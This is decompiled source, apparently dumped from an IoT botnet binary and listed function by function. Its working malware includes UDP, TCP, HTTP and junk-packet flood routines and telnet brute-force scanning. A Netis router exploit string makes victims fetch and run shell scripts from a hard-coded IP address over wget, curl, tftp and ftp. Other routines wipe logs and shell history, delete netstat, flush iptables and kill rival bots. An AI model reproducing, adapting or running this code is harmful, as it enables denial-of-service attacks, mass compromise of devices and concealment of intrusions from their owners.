    if (__GI_setsockopt(v146, 0, 3, (int32_t)&v148, 4) >= 0) {
        *v151 = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
        int32_t v152 = rand_cmwc(v150); // 0x804e86f
                while (true) {
                        int32_t v182 = ((int32_t)(v180 | _strncmp(v167, "rst", 4) % 2 == 0) | v181) ^ 1; // 0x804e989
                                    int32_t v192 = ((int32_t)(v190 | _strncmp(v167, "psh", 4) % 2 == 0) | v191) ^ 1; // 0x804ea7c
                                        HackerPrint(4, (int32_t)"psh");
                                        v176 = "psh";
                                        v176 = "psh";
                rand_cmwc((int32_t)v171);
                    v160 = rand_cmwc((int32_t)v167);
                *v163 = (int16_t)tcpcsum();
                while (true) {
                    __libc_sendto(v159, v148, v143, v144, v145, 0);
                    *(int16_t *)(v149 | 4) = (int16_t)(0x10000 * rand_cmwc(v159) / 0x10000);
                    *v153 = rand_cmwc(v159);
                    *v151 = (int16_t)(0x10000 * rand_cmwc(v159) / 0x10000);
                    *v163 = (int16_t)tcpcsum();
        rand_cmwc((int32_t)v167);
            v160 = rand_cmwc((int32_t)v167);
        *v163 = (int16_t)tcpcsum();
        while (true) {
            __libc_sendto(v159, v148, v143, v144, v145, 0);
            *(int16_t *)(v149 | 4) = (int16_t)(0x10000 * rand_cmwc(v159) / 0x10000);
            *v153 = rand_cmwc(v159);
            *v151 = (int16_t)(0x10000 * rand_cmwc(v159) / 0x10000);
            *v163 = (int16_t)tcpcsum();
        result3 = HackerPrint(v147, (int32_t)"Failed setting raw headers mode.");
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 11174
++++++++ FUNCTION END 11907
++++++++ FUNCTION LENGTH 733
    int32_t v142 = v141 ^ rand_cmwc(0); // 0x804c850
    srand(v142);
    while (true) {
                case 0: {
                                    socket(0x10000 * v164 / 0x10000, v165, v163);
                                        if (__libc_connect(v165, v163, 0) == -1) {
                                                sclose(v165);
                    socket(0x10000 * v164 / 0x10000, v165, v163);
                case 1: {
                            sclose(v161);
                            sclose(v176);
                        getsockopt(v161, v177, v174, 10, v170);
                            sclose(v161);
                case 2: {
                case 3: {
                    if (__libc_send(v178, v146, v157, v143) >= 0) {
                        if (__libc_send(v178, v146, v157, v143) >= 0) {
                case 4: {
                case 5: {
                    if (__libc_send(v179, v149, v146, v157) >= 0) {
                        if (__libc_send(v179, v149, v146, v157) >= 0) {
                case 6: {
                                    get_telstate_host();
                                    HackerPrint(v151, v149);
                                    get_telstate_host();
                                    HackerPrint(v151, v149);
                case 7: {
                    if (__libc_send(v182, v151, v149, v146) >= 0) {
                        sclose(v182);
        while (true) {
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 42765
++++++++ FUNCTION END 46467
++++++++ FUNCTION LENGTH 3702
                while (true) {
                    while (true) {
                            while (true) {
                                    while (true) {
                                                                                                    free(v253);
                                                                                                free(v253);
                                                                                        free(v253);
                                                                                    free(v253);
                                                                                            free(v253);
                                                                                            free(v253);
                                                                                        free(v253);
                                                                                    free(v253);
                                                                                    free(v253);
                                                                                free(v253);
                                                                        free(v253);
                                                                        free(v253);
                                                                    free(v253);
                                                                            free(v253);
                                                                            free(v253);
                                                                        free(v253);
                while (true) {
                while (true) {
            while (true) {
                                                                    free(v149 + 8);
                                                                    free(v149 + 8);
                                                                free(v149 + 8);
                                                        free(v149 + 8);
                                                        free(v149 + 8);
                                                    free(v149 + 8);
                                                            free(v149 + 8);
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 71873
++++++++ FUNCTION END 72508
++++++++ FUNCTION LENGTH 635
            if (fgets(v159, v144, v142) != 0) {
                while (true) {
                    __GI_fclose((int16_t *)v144);
                            v152 = __open_etc_hosts();
                            if (fgets(v159, v144, v142) != 0) {
                                while (true) {
                                    __GI_fclose((int16_t *)v144);
                            v152 = __open_etc_hosts();
                            if (fgets(v159, v144, v142) != 0) {
                                while (true) {
                                    __GI_fclose((int16_t *)v144);
    if (fgets(v159, v144, v142) != 0) {
        while (true) {
            while (true) {
                    while (true) {
                            while (true) {
                                        while (true) {
                                            while (true) {
                                                int32_t v186 = __GI_strcasecmp(v158, v185, v164, v164); // 0x8057a82
                                            if (fgets(v159, v144, v142) == 0) {
                                                    if (inet_pton(10, (char *)v189, v146, v165) >= 1) {
                                                            __GI_fclose((int16_t *)v144);
                                                if (inet_pton(2, (char *)v191, (int32_t)v147, v143) >= 1) {
                                                        __GI_fclose((int16_t *)v144);
                                            if (fgets(v159, v144, v142) == 0) {
                                    if (fgets(v159, v144, v142) == 0) {
                                __GI_fclose((int16_t *)v144);
            __GI_fclose((int16_t *)v144);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2556
++++++++ FUNCTION END 3047
++++++++ FUNCTION LENGTH 491
                    while (true) {
                        printchar(v144, v143);
                        printchar(v144, v143);
                            printchar(v144, v143);
                    printchar(v144, (int32_t)*a2);
                        printchar(v144, (int32_t)*v149);
                    printchar(v144, v143);
                        printchar(v144, v143);
                printchar(v144, v143);
                    printchar(v144, v143);
            printchar(v144, (int32_t)*a2);
                printchar(v144, (int32_t)*v149);
            printchar(v144, v143);
                printchar(v144, v143);
            while (true) {
                printchar(v144, v143);
                printchar(v144, v143);
                    printchar(v144, v143);
            printchar(v144, (int32_t)*a2);
                printchar(v144, (int32_t)*v149);
            printchar(v144, v143);
                printchar(v144, v143);
        printchar(v144, v143);
            printchar(v144, v143);
    printchar(v144, (int32_t)*a2);
        printchar(v144, (int32_t)*v149);
    printchar(v144, v143);
        printchar(v144, v143);
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 13116
++++++++ FUNCTION END 13453
++++++++ FUNCTION LENGTH 337
        rand_cmwc(2);
    int32_t result = getHost(a1, &v144); // 0x804e220
        int32_t v146 = socket(2, 2, 17); // 0x804e25c
                makeRandomStr(v149, a5);
                while (true) {
                    __libc_sendto(v146, v148, a5, 0, (int32_t)&v143, 16);
                            rand_cmwc(v146);
            result3 = HackerPrint(v145, (int32_t)"Failed opening raw socket.");
    int32_t v152 = socket(2, 3, 17); // 0x804e347
        if (__GI_setsockopt(v152, 0, 3, (int32_t)&v153, 4) < 0) {
            result4 = HackerPrint(v145, (int32_t)"Failed setting raw headers mode.");
        int32_t v156 = v155 ^ rand_cmwc(0); // 0x804e3ce
        srand(v156);
        init_rand(random());
            v156 = v155 ^ rand_cmwc(0);
            srand(v156);
            init_rand(random());
        *v159 = (int16_t)(0x10000 * rand_cmwc(v158) / 0x10000);
            v160 = rand_cmwc(v158);
        makeRandomStr((char *)v162, v142);
        while (true) {
            __libc_sendto(v167, (int32_t)&v168, (int32_t)&v168, (int32_t)&v168, (int32_t)&v168, (int32_t)&v168);
            *v159 = (int16_t)(0x10000 * rand_cmwc(v167) / 0x10000);
                v169 = rand_cmwc(v167);
            *(int16_t *)(v157 | 4) = (int16_t)(0x10000 * rand_cmwc(v172) / 0x10000);
    result4 = HackerPrint(v145, (int32_t)"Failed opening raw socket.");
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 64079
++++++++ FUNCTION END 64615
++++++++ FUNCTION LENGTH 536
    int32_t v143 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v142); // 0x805641d
        if (fgets(v153, 128, v147) != 0) {
            while (true) {
        __GI_fclose((int16_t *)v144);
    int32_t v156 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v142); // 0x805643b
    if (fgets(v153, 128, v147) == 0) {
        __GI_fclose((int16_t *)v144);
    while (true) {
            while (true) {
                                while (true) {
                                            while (true) {
                                                while (true) {
                                        while (true) {
                                                if (fgets(v153, 128, v147) == 0) {
                                            while (true) {
                                                free(v195);
                                            __GI_fclose((int16_t *)v144);
                                        while (true) {
                                        if (fgets(v153, 128, v147) == 0) {
                if (fgets(v153, 128, v147) == 0) {
            __GI_fclose((int16_t *)v144);
        if (fgets(v153, 128, v147) == 0) {
    __GI_fclose((int16_t *)v144);
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 34347
++++++++ FUNCTION END 35435
++++++++ FUNCTION LENGTH 1088
        while (true) {
                while (true) {
                    while (true) {
                            while (true) {
                                            while (true) {
                                                while (true) {
                                                    while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                    while (true) {
                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 25313
++++++++ FUNCTION END 25582
++++++++ FUNCTION LENGTH 269
    int32_t v141 = socket(2, 2, 0); // 0x8050985
        inet_addr((int32_t)"8.8.8.8");
        if (__libc_connect(v141, (int32_t)&v142, 16) != -1) {
            int32_t v145 = __GI_getsockname(v141, (int32_t)&v144, (int32_t)&v143); // 0x8050a2e
                int32_t v148 = __libc_open("/proc/net/route", 0); // 0x8050a60
                if (fdgets(v150, 0x1000, v148) != 0) {
                    while (true) {
                        if (strstr(v150, "\t00000000\t") == 0) {
                            if (fdgets(v150, 0x1000, v148) == 0) {
                                __libc_close(v148);
                                    __libc_close(v141);
                                __libc_close(v141);
                        __libc_close(v148);
                            __libc_close(v141);
                        __libc_close(v141);
                __libc_close(v148);
                __libc_close(v141);
=================FUNCTION : sendJUNK ===================
++++++++ FUNCTION START 14095
++++++++ FUNCTION END 14412
++++++++ FUNCTION LENGTH 317
    int32_t v144 = getdtablesize(v143); // 0x804ec7f
    int32_t result = getHost(a1, &v147); // 0x804ecbd
        while (true) {
        while (true) {
                        __libc_close(v171);
                    getsockopt(v165, v164, 0x2710, v163, (int32_t)&v170);
                        __libc_close(v165);
                    makeRandomStr((char *)v162, v143);
                    if (__libc_send(v165, v164, v154, v163) != -1) {
                    __libc_close(v165);
                    socket(v162, v143, v166);
                    if (__libc_connect(v162, v143, v166) != -1) {
                        __libc_close(v162);
=================FUNCTION : RemoveTMP ===================
++++++++ FUNCTION START 12395
++++++++ FUNCTION END 12551
++++++++ FUNCTION LENGTH 156
    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /tmp/*");
    __libc_system((int32_t)"history -c");
    __libc_system((int32_t)"rm -rf ~/.bash_history");
    __libc_system((int32_t)"rm -rf /bin/netstat");
    __libc_system((int32_t)"history -w");
    __libc_system((int32_t)"pkill -9 busybox");
    __libc_system((int32_t)"pkill -9 perl");
    __libc_system((int32_t)"service iptables stop");
    return __libc_system((int32_t)"/sbin/iptables -F;/sbin/iptables -X");
=================FUNCTION : sendHOLD ===================
++++++++ FUNCTION START 14415
++++++++ FUNCTION END 14709
++++++++ FUNCTION LENGTH 294
    int32_t v144 = getdtablesize(v143); // 0x804f02a
    int32_t result = getHost(a1, &v147); // 0x804f068
        while (true) {
        while (true) {
                        __libc_close(v166);
                    getsockopt(v168, v165, 0x2710, v161, (int32_t)&v162);
                        __libc_close(v168);
                    __libc_close(v172);
                    socket(v159, v143, (int32_t)&v162);
                    if (__libc_connect(v159, v143, (int32_t)&v162) != -1) {
                        __libc_close(v159);
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 66472
++++++++ FUNCTION END 67503
++++++++ FUNCTION LENGTH 1031
                        free(result);
                if (__libc_open((char *)v152, v150) >= 0) {
                                free(v148);
                free(result);
            if (__libc_open((char *)v152, v150) >= 0) {
                                free(v148);
            free(v148);
        if (__libc_open((char *)v152, v150) >= 0) {
            free(v148);
                            free(v148);
        free(result);
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 5771
++++++++ FUNCTION END 5984
++++++++ FUNCTION LENGTH 213
    int32_t v142 = __libc_open("/proc/cpuinfo", 0); // 0x8048ea1
    if (fdgets(v144, 0x1000, v142) != 0) {
        while (true) {
            uppercase((char *)&v143);
            if (strstr(v144, "BOGOMIPS") != v144) {
                if (fdgets(v144, 0x1000, v142) == 0) {
                while (true) {
                                while (true) {
                                            __libc_close(v142);
    __libc_close(v142);
=================FUNCTION : print ===================
++++++++ FUNCTION START 3297
++++++++ FUNCTION END 3749
++++++++ FUNCTION LENGTH 452
    while (true) {
            printchar((int32_t *)result, v150);
                    while (true) {
                        while (true) {
                                            int32_t v176 = prints(v174, NULL, (int32_t)&v175, (int32_t)&v175); // 0x8048798
                                            int32_t v178 = printi(v177) + result; // 0x8048769
                                        result2 = printi(v173) + result;
                                    result2 = printi(v172) + result;
                                result2 = printi(v171) + result;
                            int32_t v180 = prints((int32_t)v179, (char *)v161, v155, result) + result; // 0x8048685
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 5987
++++++++ FUNCTION END 6152
++++++++ FUNCTION LENGTH 165
    int32_t v142 = __libc_open("/proc/cpuinfo", 0); // 0x804905e
    if (fdgets(v144, 0x1000, v142) == 0) {
        __libc_close(v142);
    uppercase((char *)&v143);
    int32_t result = strstr(v144, "BOGOMIPS") == v144;
    while (fdgets(v144, 0x1000, v142) != 0) {
        uppercase((char *)&v143);
        result += (int32_t)(strstr(v144, "BOGOMIPS") == v144);
    __libc_close(v142);
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 52526
++++++++ FUNCTION END 53246
++++++++ FUNCTION LENGTH 720
        while (true) {
            v155 = getuid();
            if (v155 == geteuid()) {
                v156 = getgid();
                if (v156 == getegid()) {
    v155 = getuid();
    if (v155 != geteuid()) {
    v156 = getgid();
    if (v156 == getegid()) {
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 70378
++++++++ FUNCTION END 70898
++++++++ FUNCTION LENGTH 520
        return inet_ntop4(v147, v145, v143);
        while (true) {
                            while (true) {
                                                        v184 = inet_ntop4((int32_t)v149, (int32_t)v163, v162);
                                                v180 = v146 + sprintf(v179, (int32_t)"%x");
                                            v184 = inet_ntop4((int32_t)v149, (int32_t)v163, v162);
                                v180 = v146 + sprintf(v179, (int32_t)"%x");
                while (true) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 12731
++++++++ FUNCTION END 12926
++++++++ FUNCTION LENGTH 195
    random();
    random();
    sprintf(v145, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n");
        while (true) {
            if (__libc_fork(v146) != 0) {
                while (true) {
                    int32_t v147 = socket_connect(a1, a3); // 0x804dfeb
                        __libc_close(v147);
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 13456
++++++++ FUNCTION END 13623
++++++++ FUNCTION LENGTH 167
    inet_addr(a1);
    int32_t v144 = socket(2, 1, 0); // 0x804e68c
    __libc_connect(v144, (int32_t)&v143, 16);
    __libc_close(v144);
        v144 = socket(2, 1, 0);
        __libc_connect(v144, (int32_t)&v143, 16);
        __libc_close(v144);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 7132
++++++++ FUNCTION END 7330
++++++++ FUNCTION LENGTH 198
        __libc_send(a1, v146, 1, 0x4000);
                __libc_send(a1, v146, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v146, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v146, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 12929
++++++++ FUNCTION END 13113
++++++++ FUNCTION LENGTH 184
    int32_t v142 = socket(2, 2, 0); // 0x804e086
    __GI_gethostbyname(a1);
    while (true) {
        random();
            __libc_send(v142, v152, 75, 0);
            __libc_connect(v142, v145, 16);
                __libc_close(v142);
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 4679
++++++++ FUNCTION END 4877
++++++++ FUNCTION LENGTH 198
        __libc_close(v143);
        __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v144, (int32_t)&v146);
        while (true) {
            int32_t v149 = __libc_waitpid(v148, (int32_t)&v147, 0); // 0x8048ba6
            __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
        __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 50551
++++++++ FUNCTION END 50795
++++++++ FUNCTION LENGTH 244
        while (true) {
                    int32_t v148 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v144, v147); // 0x805479f
                        while (true) {
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
=================FUNCTION : NetisRanges ===================
++++++++ FUNCTION START 9199
++++++++ FUNCTION END 9353
++++++++ FUNCTION LENGTH 154
    random();
    int32_t v139 = random(); // 0x804c348
    int32_t v142 = random(); // 0x804c364
    int32_t v145 = random(); // 0x804c380
    szprintf(v148, (int32_t)"%d.%d.%d.%d", (int32_t)v149, (int32_t)v138);
    return inet_addr(v148);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 6316
++++++++ FUNCTION END 6581
++++++++ FUNCTION LENGTH 265
            while (true) {
                HackerPrint(v158, (int32_t)"PING");
                while (true) {
                        if (__libc_recv(v158, (int32_t)&v161, 1, 0) != 1) {
        while (true) {
    while (true) {
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 61930
++++++++ FUNCTION END 62250
++++++++ FUNCTION LENGTH 320
        while (true) {
            while (true) {
            while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : StartTheNetis ===================
++++++++ FUNCTION START 11910
++++++++ FUNCTION END 12068
++++++++ FUNCTION LENGTH 158
    while (true) {
        int32_t v146 = socket(2, 2, 0); // 0x804db03
        NetisRanges(v146);
        sprintf(v145, (int32_t)"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00");
        __libc_sendto(v146, v145, v147, 0, v143, 16);
=================FUNCTION : printi ===================
++++++++ FUNCTION START 3050
++++++++ FUNCTION END 3294
++++++++ FUNCTION LENGTH 244
            while (true) {
                    printchar((int32_t *)a1, 45);
                    return prints(a1, (char *)v152, v144 - 1, v145) + 1;
        result = prints(a1, (char *)v165, v144, v145);
        result = prints(a1, (char *)&v167, v144, v145);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 69707
++++++++ FUNCTION END 70150
++++++++ FUNCTION LENGTH 443
        result = inet_pton4(v145, v146, v143);
        while (true) {
            while (true) {
                while (true) {
                            if (inet_pton4(v160, (int32_t)v161, v150) >= 1) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 48776
++++++++ FUNCTION END 48999
++++++++ FUNCTION LENGTH 223
            while (true) {
                    __GI_random_r((int32_t *)a2, (int32_t)&v147);
                        __GI_random_r((int32_t *)a2, (int32_t)&v147);
            __GI_random_r((int32_t *)a2, (int32_t)&v147);
                __GI_random_r((int32_t *)a2, (int32_t)&v147);
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 7537
++++++++ FUNCTION END 7777
++++++++ FUNCTION LENGTH 240
        while (true) {
            int32_t v148 = __libc_recv(a1, v147, 1, 0); // 0x804990d
                        int32_t v151 = __libc_recv(a1, v147 + 1, 2, 0); // 0x804994e
                    if (strstr(v143, (char *)a2) == 0) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 12554
++++++++ FUNCTION END 12728
++++++++ FUNCTION LENGTH 174
    if (__GI_gethostbyname(a1) == 0) {
    int32_t result = socket(2, 1, 6); // 0x804de9f
    __GI_setsockopt(result, 6, 1, (int32_t)&v142, 4);
    if (__libc_connect(result, (int32_t)&v146, 16) != -1) {
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 36793
++++++++ FUNCTION END 37073
++++++++ FUNCTION LENGTH 280
    while (true) {
    while (true) {
                    while (true) {
            while (true) {
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 49674
++++++++ FUNCTION END 50215
++++++++ FUNCTION LENGTH 541
        while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 12218
++++++++ FUNCTION END 12392
++++++++ FUNCTION LENGTH 174
        __GI_snprintf(v147, 127, (int32_t)">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n", v152, v151, v150);
        __libc_system(v147);
        sprintf(v154, (int32_t)"pkill -9 %s\r\n");
        result = __libc_system(v154);
=================FUNCTION : abort ===================
++++++++ FUNCTION START 47442
++++++++ FUNCTION END 47663
++++++++ FUNCTION LENGTH 221
    while (true) {
                __GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v144, 0);
                while (true) {
                while (true) {
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 6955
++++++++ FUNCTION END 7129
++++++++ FUNCTION LENGTH 174
    int32_t result = __libc_fork(v139); // 0x8049564
        while (true) {
                    free(v146);
=================FUNCTION : hostname_to_ip ===================
++++++++ FUNCTION START 6584
++++++++ FUNCTION END 6748
++++++++ FUNCTION LENGTH 164
    if (__GI_gethostbyname(a1) == 0) {
        __GI_herror("gethostbyname");
        strcpy((char *)a2, __GI_inet_ntoa(v143));
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 6751
++++++++ FUNCTION END 6952
++++++++ FUNCTION LENGTH 201
    if (getHost(a2, &v143) != 0) {
    int32_t v144 = __libc_connect(a1, (int32_t)&v142, 16); // 0x8049434
    getsockopt(a1, 1, 4, (int32_t)&v152, (int32_t)&v151);
=================FUNCTION : HackerPrint ===================
++++++++ FUNCTION START 4048
++++++++ FUNCTION END 4200
++++++++ FUNCTION LENGTH 152
    print(&v143, a2, (int32_t)&v145);
    int32_t result = __libc_send(a1, v142, _strlen(v144), 0x4000); // 0x80488c2
    free(v142);
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 65381
++++++++ FUNCTION END 65580
++++++++ FUNCTION LENGTH 199
    if (__libc_close(v143) < 0) {
        free(v151);
    _stdio_openlist_dec_use();
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 68050
++++++++ FUNCTION END 68299
++++++++ FUNCTION LENGTH 249
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 25133
++++++++ FUNCTION END 25310
++++++++ FUNCTION LENGTH 177
        __libc_close(v142);
    int32_t v150 = socket(2, 1, 0); // 0x8050929
    return connectTimeout(v150, v140, v147, 30) == 0;
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 62430
++++++++ FUNCTION END 62636
++++++++ FUNCTION LENGTH 206
        while (true) {
                while (true) {
=================FUNCTION : __GI_vfprintf ===================
++++++++ FUNCTION START 32125
++++++++ FUNCTION END 32320
++++++++ FUNCTION LENGTH 195
        result = _vfprintf_internal(v145, (char *)a2, a3, v148);
        result = _vfprintf_internal(v144, (char *)a2, a3, v148);
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 49187
++++++++ FUNCTION END 49377
++++++++ FUNCTION LENGTH 190
    int32_t v145 = __vfork(v144); // 0x8054429
    if (wait4(v145, (int32_t)&result, 0, 0) == -1) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 57742
++++++++ FUNCTION END 57986
++++++++ FUNCTION LENGTH 244
        while (true) {
    while (true) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 32679
++++++++ FUNCTION END 33503
++++++++ FUNCTION LENGTH 824
    while (true) {
                                                                                    while (true) {
=================FUNCTION : __GI_herror ===================
++++++++ FUNCTION START 39082
++++++++ FUNCTION END 39261
++++++++ FUNCTION LENGTH 179
        return fprintf(v144, (int32_t)"%s%s%s\n", v141, v147, v143);
    return fprintf(v144, (int32_t)"%s%s%s\n", v141, v148, v143);
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 62639
++++++++ FUNCTION END 62888
++++++++ FUNCTION LENGTH 249
        while (true) {
            while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 31768
++++++++ FUNCTION END 31963
++++++++ FUNCTION LENGTH 195
        while (true) {
    while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 73518
++++++++ FUNCTION END 73756
++++++++ FUNCTION LENGTH 238
            while (true) {
                while (true) {
=================FUNCTION : trim ===================
++++++++ FUNCTION START 2189
++++++++ FUNCTION END 2394
++++++++ FUNCTION LENGTH 205
    while (true) {
            while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 49002
++++++++ FUNCTION END 49184
++++++++ FUNCTION LENGTH 182
        srandom_r((int64_t)a1, a4);
    srandom_r((int64_t)a1, a4);
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 6155
++++++++ FUNCTION END 6313
++++++++ FUNCTION LENGTH 158
        rand_cmwc(v142);
            rand_cmwc(v142);
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 67834
++++++++ FUNCTION END 68047
++++++++ FUNCTION LENGTH 213
    while (true) {
                free(v151);
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 71716
++++++++ FUNCTION END 71870
++++++++ FUNCTION LENGTH 154
    int32_t v142 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v141); // 0x805782d
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v141);
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 37666
++++++++ FUNCTION END 37881
++++++++ FUNCTION LENGTH 215
        while (true) {
            while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 10994
++++++++ FUNCTION END 11171
++++++++ FUNCTION LENGTH 177
    while (true) {
        if (strcasestr((char *)a1, v145) == 0) {
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 69123
++++++++ FUNCTION END 69322
++++++++ FUNCTION LENGTH 199
    while (true) {
        while (true) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 7333
++++++++ FUNCTION END 7534
++++++++ FUNCTION LENGTH 201
    while (true) {
                while (true) {
=================FUNCTION : __malloc_consolidate ===================
++++++++ FUNCTION START 46658
++++++++ FUNCTION END 46948
++++++++ FUNCTION LENGTH 290
        while (true) {
                while (true) {
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 56573
++++++++ FUNCTION END 56797
++++++++ FUNCTION LENGTH 224
    while (true) {
            while (true) {
=================FUNCTION : __GI_sigprocmask ===================
++++++++ FUNCTION START 29903
++++++++ FUNCTION END 30084
++++++++ FUNCTION LENGTH 181
        v143 = sigprocmask(how, set, oset);
    v143 = sigprocmask(how, set, oset);
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 68302
++++++++ FUNCTION END 68524
++++++++ FUNCTION LENGTH 222
            while (true) {
                int32_t v149 = getc_unlocked(); // 0x8056ed1
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 68883
++++++++ FUNCTION END 69120
++++++++ FUNCTION LENGTH 237
        while (true) {
    while (true) {
=================FUNCTION : kill ===================
++++++++ FUNCTION START 28637
++++++++ FUNCTION END 28793
++++++++ FUNCTION LENGTH 156
    int32_t v144 = kill(v142, v143); // 0x8051693
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 33866
++++++++ FUNCTION END 34186
++++++++ FUNCTION LENGTH 320
        while (true) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 73118
++++++++ FUNCTION END 73292
++++++++ FUNCTION LENGTH 174
    while (true) {
=================FUNCTION : _fini ===================
++++++++ FUNCTION START 74686
++++++++ FUNCTION END 74832
++++++++ FUNCTION LENGTH 146
    __get_pc_thunk_bx(v142);
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 27848
++++++++ FUNCTION END 27999
++++++++ FUNCTION LENGTH 151
    if ((uint32_t)getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : __vfork ===================
++++++++ FUNCTION START 26432
++++++++ FUNCTION END 26577
++++++++ FUNCTION LENGTH 145
    uint32_t result = vfork(); // 0x80513d2
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 10237
++++++++ FUNCTION END 10382
++++++++ FUNCTION LENGTH 145
    return __GI_inet_ntoa(v142);
=================FUNCTION : __libc_getpid ===================
++++++++ FUNCTION START 28160
++++++++ FUNCTION END 28316
++++++++ FUNCTION LENGTH 156
    int32_t pid = getpid(v142); // 0x80515ed
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 5456
++++++++ FUNCTION END 5601
++++++++ FUNCTION LENGTH 145
    int32_t v142 = inet_addr(a1); // 0x8048e2c
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 64765
++++++++ FUNCTION END 64909
++++++++ FUNCTION LENGTH 144
